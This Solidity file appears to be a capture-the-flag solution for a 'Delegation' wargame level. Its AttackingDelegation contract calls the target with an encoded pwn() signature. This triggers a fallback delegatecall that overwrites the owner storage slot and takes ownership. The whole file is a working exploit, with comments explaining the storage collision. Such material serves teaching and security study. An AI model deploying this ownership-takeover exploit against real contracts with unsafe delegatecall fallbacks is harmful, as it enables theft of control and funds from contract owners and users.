// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // this will trigger the fallback method as pwn() does not exist
        // delegatecall will call Delegate using the same msg.sender and
        // the memory space of Delegation
        // as the address owner is at the same slot in both contracts it'll
        // overwrite
        contractAddress.call(
            abi.encodeWithSignature("pwn()")
        );

    }
}
